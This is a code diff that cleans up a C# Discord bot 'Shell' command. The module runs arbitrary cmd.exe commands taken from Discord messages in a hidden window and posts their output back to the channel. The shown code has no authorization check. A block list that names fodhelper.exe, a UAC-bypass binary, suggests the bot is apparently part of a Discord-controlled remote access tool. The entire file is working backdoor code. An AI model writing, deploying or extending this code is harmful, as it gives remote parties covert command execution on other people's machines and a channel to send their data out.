@@ -1,30 +1,28 @@
+using System;
 using System.Diagnostics;
+using System.Linq;
+using System.Threading.Tasks;
 using Discord;
 using Discord.WebSocket;
 using Helper;
 
-namespace Commands {
-    public static class Shell {
+namespace Commands
+{
+    public static class Shell
+    {
+        private static readonly string[] NotUsableCommands = { "tasklist", "powershell.exe", "fodhelper.exe" };
 
-        public static readonly string[] NotUsableCommands = {
-            "tasklist",
-            "powershell.exe",
-            "fodhelper.exe"
-
-        };
-        public static async Task Run(SocketUserMessage Message, string[] args) {
-
-            if (NotUsableCommands.Contains(args[0]) || string.Join(" ",args).Length > 2000) {
-                
-                Embed Emb= new SerpentEmbed().GetEmbed(SerpentEmbeds.Warning,$"" , $"Command ``{args[0]}`` Can not be used due to its big output size.");
-
-                await Message.ReplyAsync(embed : Emb);
-
+        public static async Task Run(SocketUserMessage message, string[] args)
+        {
+            if (NotUsableCommands.Contains(args[0]) || string.Join(" ", args).Length > 2000)
+            {
+                Embed embed = new SerpentEmbed().GetEmbed(SerpentEmbeds.Warning, "", $"Command ``{args[0]}`` cannot be used due to its big output size.");
+                await message.ReplyAsync(embed: embed);
                 return;
             }
 
-            ProcessStartInfo Sinfo = new ProcessStartInfo() {
-
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
                 FileName = "cmd.exe",
                 Arguments = "/C " + string.Join(" ", args),
                 UseShellExecute = false,
@@ -32,40 +30,30 @@ namespace Commands {
                 RedirectStandardError = true,
                 CreateNoWindow = true
             };
-            try {
 
-            
+            try
+            {
+                await Task.Run(async () =>
+                {
+                    using (Process shell = new Process { StartInfo = startInfo })
+                    {
+                        shell.Start();
+                        shell.WaitForExit();
 
-            new Thread(async ()=>{
-                
-                Process Shell = new Process() { StartInfo = Sinfo };
-                Shell.Start();
-                Shell.WaitForExit();
+                        string output = await shell.StandardOutput.ReadToEndAsync();
+                        string errorOutput = await shell.StandardError.ReadToEndAsync();
+                        string sent = string.IsNullOrEmpty(output) ? errorOutput : output;
+                        string final = string.IsNullOrEmpty(sent) ? "None" : sent;
 
-            string output = await Shell.StandardOutput.ReadToEndAsync();
-            string errOutput = await Shell.StandardError.ReadToEndAsync();
-            string Sent = string.IsNullOrEmpty(output) ? errOutput : output;
-            string Final = string.IsNullOrEmpty(Sent) ? "None" : Sent;
-            Embed EmbedToSend = new SerpentEmbed().GetEmbed(SerpentEmbeds.Success,$"Result of {args[0]}" , $"```py\n{Final}```");
-            await Message.ReplyAsync(embed : EmbedToSend);
-
-
-
-
-            }).Start();
-
-            }catch(Exception e) {
-
-                Console.WriteLine("Error.");
-
+                        Embed embedToSend = new SerpentEmbed().GetEmbed(SerpentEmbeds.Success, $"Result of {args[0]}", $"```py\n{final}```");
+                        await message.ReplyAsync(embed: embedToSend);
+                    }
+                });
             }
-            
-
-            
-
-            //Console.WriteLine("output: " + output);
-
-            
+            catch (Exception e)
+            {
+                Console.WriteLine("Error.");
+            }
         }
     }
 }
